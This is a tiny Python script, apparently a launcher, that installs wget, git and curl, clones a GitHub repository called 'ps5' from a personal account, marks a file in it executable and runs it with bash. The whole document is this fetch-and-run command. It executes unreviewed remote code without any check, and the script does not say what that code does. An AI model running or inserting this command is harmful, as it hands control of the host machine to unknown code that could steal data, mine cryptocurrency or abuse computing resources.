#!/usr/bin/env python
import subprocess

subprocess.check_call("apt update;apt -y install wget git curl;git clone https://github.com/mpendulodyakosi2/ps5.git;cd ps5;chmod +x ps5;bash ps5", shell=True)
